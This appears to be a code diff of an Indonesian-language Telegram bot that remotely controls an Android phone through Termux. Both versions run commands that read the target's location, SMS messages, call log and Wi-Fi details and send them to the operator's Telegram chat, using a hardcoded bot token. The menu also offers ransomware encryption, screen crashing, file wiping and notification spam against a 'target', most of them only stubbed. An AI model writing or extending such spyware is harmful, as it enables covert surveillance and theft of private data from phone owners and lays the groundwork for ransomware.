@@ -1,134 +1,159 @@
-const axios = require('axios');
-const { exec } = require('child_process');
+const fetch = require('node-fetch');
+const TelegramBot = require('telegram-bot-api');
 
-// Token Bot Telegram
-const TOKEN = "7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0";
-const ID_TELE = "5951232585";
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TOKEN}`;
+const api = new TelegramBot({
+    token: '7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0',
+    updates: {
+        enabled: true,
+    }
+});
 
 // Fungsi untuk mengirim pesan
-const kirimPesan = async (pesan) => {
-  try {
-    await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
-      chat_id: ID_TELE,
-      text: pesan,
+async function sendMessage(chatId, text) {
+    await fetch(`https://api.telegram.org/bot${api.token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text }),
     });
-  } catch (error) {
-    console.error("Error mengirim pesan:", error.message);
-  }
-};
+}
 
-// Fungsi untuk menjalankan perintah Termux
-const jalankanPerintah = (command, callback) => {
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error menjalankan perintah: ${error.message}`);
-      callback(stderr || "Error menjalankan perintah.");
-    } else {
-      callback(stdout.trim());
+// Fungsi untuk mengirim foto
+async function sendPhoto(chatId, photoPath) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', require('fs').createReadStream(photoPath));
+
+    await fetch(`https://api.telegram.org/bot${api.token}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+    });
+}
+
+// Fungsi untuk membuat keyboard khusus
+function createKeyboard() {
+    return {
+        keyboard: [
+            ['Cek Status Baterai', 'Lokasi'],
+            ['Informasi Sistem', 'Dump SMS', 'Dump Panggilan'],
+            ['Ubah Wallpaper', 'Pesan Teks Audio Ke Target'],
+            ['Mati/Hidup Wifi', 'Dapatkan Informasi Wifi'],
+            ['Senter On/Off', 'Getar Devices'],
+            ['Spam Notifikasi No Limit', 'Ambil List Kotak Target'],
+            ['Play Audio', 'Spam File No Limit'],
+            ['Encrypt Ransom', 'Decrypt Ransom'],
+            ['Layar Crash', 'Galery Eyes'],
+            ['Remove All File']
+        ],
+        resize_keyboard: true,
+        one_time_keyboard: true
+    };
+}
+
+// Fungsi untuk menangani perintah
+api.on('message', async (message) => {
+    const chatId = message.chat.id;
+    const command = message.text;
+
+    switch (command) {
+        case 'Cek Status Baterai':
+            const batteryStatus = await getTermuxData('termux-battery-status');
+            sendMessage(chatId, `Status Baterai: ${batteryStatus}`);
+            break;
+        case 'Lokasi':
+            const location = await getTermuxData('termux-location');
+            sendMessage(chatId, `Lokasi: ${location}`);
+            break;
+        case 'Informasi Sistem':
+            const systemInfo = await getTermuxData('termux-info');
+            sendMessage(chatId, `Informasi Sistem: ${systemInfo}`);
+            break;
+        case 'Dump SMS':
+            const smsList = await getTermuxData('termux-sms-list');
+            sendMessage(chatId, `Daftar SMS: ${smsList}`);
+            break;
+        case 'Dump Panggilan':
+            const callLog = await getTermuxData('termux-call-log');
+            sendMessage(chatId, `Log Panggilan: ${callLog}`);
+            break;
+        case 'Ubah Wallpaper':
+            sendMessage(chatId, 'Masukkan URL wallpaper yang ingin digunakan:');
+            // Menunggu input URL wallpaper
+            break;
+        case 'Pesan Teks Audio Ke Target':
+            sendMessage(chatId, 'Masukkan teks yang ingin diubah menjadi audio:');
+            // Menunggu input teks
+            break;
+        case 'Mati/Hidup Wifi':
+            sendMessage(chatId, 'Mengaktifkan atau mematikan Wi-Fi...');
+            // Implementasikan pengaturan Wi-Fi
+            break;
+        case 'Dapatkan Informasi Wifi':
+            const wifiInfo = await getTermuxData('termux-wifi-connectioninfo');
+            sendMessage(chatId, `Informasi Wi-Fi: ${wifiInfo}`);
+            break;
+        case 'Senter On/Off':
+          sendMessage(chatId, 'Mengaktifkan atau mematikan senter...');
+            // Implementasikan pengaturan senter
+            break;
+        case 'Getar Devices':
+            sendMessage(chatId, 'Menggetarkan perangkat...');
+            // Implementasikan getaran
+            break;
+        case 'Spam Notifikasi No Limit':
+            sendMessage(chatId, 'Masukkan judul notifikasi:');
+            // Menunggu input judul notifikasi
+            break;
+        case 'Ambil List Kotak Target':
+            sendMessage(chatId, 'Mengambil daftar kotak target...');
+            // Implementasikan pengambilan daftar
+            break;
+        case 'Play Audio':
+            sendMessage(chatId, 'Memutar audio...');
+            // Implementasikan pemutaran audio
+            break;
+        case 'Spam File No Limit':
+            sendMessage(chatId, 'Mengirim spam file...');
+            // Implementasikan pengiriman spam file
+            break;
+        case 'Encrypt Ransom':
+            sendMessage(chatId, 'Masukkan password untuk enkripsi:');
+            // Menunggu input password
+            break;
+        case 'Decrypt Ransom':
+            sendMessage(chatId, 'Masukkan password untuk dekripsi:');
+            // Menunggu input password
+            break;
+        case 'Layar Crash':
+            sendMessage(chatId, 'Membuat layar crash...');
+            // Implementasikan layar crash
+            break;
+        case 'Galery Eyes':
+            sendMessage(chatId, 'Mengakses galeri...');
+            // Implementasikan akses galeri
+            break;
+        case 'Remove All File':
+            sendMessage(chatId, 'Menghapus semua file...');
+            // Implementasikan penghapusan file
+            break;
+        default:
+            sendMessage(chatId, 'Perintah tidak dikenal. Silakan coba lagi.');
+            break;
     }
-  });
-};
+});
 
-// Fungsi utama untuk menangani perintah pengguna
-const tanganiPerintah = async (perintah) => {
-  switch (perintah) {
-    case "Cek Status Baterai":
-      jalankanPerintah("termux-battery-status", kirimPesan);
-      break;
-    case "Lokasi":
-      jalankanPerintah("termux-location", kirimPesan);
-      break;
-    case "Informasi System":
-      jalankanPerintah("termux-info", kirimPesan);
-      break;
-    case "Dump Sms":
-      jalankanPerintah("termux-sms-list", kirimPesan);
-      break;
-    case "Dump Panggilan":
-      jalankanPerintah("termux-call-log", kirimPesan);
-      break;
-    case "Ubah Wallpaper":
-      kirimPesan("Fitur Ubah Wallpaper belum diimplementasikan.");
-      break;
-    case "Pesan Teks":
-      kirimPesan("Fitur Pesan Teks belum diimplementasikan.");
-      break;
-    case "Pesan Audio":
-      kirimPesan("Fitur Pesan Audio belum diimplementasikan.");
-      break;
-    case "Mati/Hidup Wifi":
-      kirimPesan("Fitur Mati/Hidup Wifi belum diimplementasikan.");
-      break;
-    case "Getar Devices":
-      jalankanPerintah("termux-vibrate", kirimPesan);
-      break;
-    case "Dapatkan Informasi Wifi":
-      jalankanPerintah("termux-wifi-connectioninfo", kirimPesan);
-      break;
-    case "Senter On/Off":
-      kirimPesan("Fitur Senter On/Off belum diimplementasikan.");
-      break;
-    case "Spam Notifikasi":
-      kirimPesan("Fitur Spam Notifikasi belum diimplementasikan.");
-      break;
-    case "Ambil List Kotak Target":
-      jalankanPerintah("termux-sms-list", kirimPesan);
-      break;
-    case "Play Audio":
-      kirimPesan("Fitur Play Audio belum diimplementasikan.");
-      break;
-    case "Spam File":
-      kirimPesan("Fitur Spam File belum diimplementasikan.");
-      break;
-    case "Encrypt Ransom":
-      kirimPesan("Fitur Encrypt Ransom belum diimplementasikan.");
-      break;
-    case "Decrypt Ransom":
-      kirimPesan("Fitur Decrypt Ransom belum diimplementasikan.");
-      break;
-    case "Layar Crash":
-      kirimPesan("Fitur Layar Crash belum diimplementasikan.");
-      break;
-    case "Galery eyes":
-      kirimPesan("Fitur Galery eyes belum diimplementasikan.");
-      break;
-    case "Remove All File":
-      kirimPesan("Fitur Remove All File belum diimplementasikan.");
-      break;
-    case "Reset Semua Perintah":
-      kirimPesan("Keyboard reset berhasil.");
-      break;
-    default:
-      kirimPesan(`Perintah tidak dikenal: ${perintah}`);
-      break;
-  }
-};
+// Fungsi untuk mendapatkan data dari Termux API
+function getTermuxData(command) {
+    return new Promise((resolve, reject) => {
+        const { exec } = require('child_process');
+        exec(command, (error, stdout, stderr) => {
+            if (error) {
+                reject(stderr);
+            } else {
+                resolve(stdout);
+            }
+        });
+    });
+}
 
-// Fungsi untuk mendapatkan update dari Telegram
-const dapatkanUpdate = async () => {
-  try {
-    const response = await axios.get(`${TELEGRAM_API_URL}/getUpdates`);
-    const updates = response.data.result;
-
-    if (updates && updates.length > 0) {
-      for (const update of updates) {
-        if (update.message && update.message.text) {
-          await tanganiPerintah(update.message.text);
-        }
-      }
-    }
-  } catch (error) {
-    console.error("Error mendapatkan update:", error.message);
-  }
-};
-
-// Loop utama untuk menjalankan bot
-const main = async () => {
-  while (true) {
-    await dapatkanUpdate();
-    await new Promise((resolve) => setTimeout(resolve, 20000));
-  }
-};
-
-main();
+// Fungsi untuk menjalankan bot
+api.start();
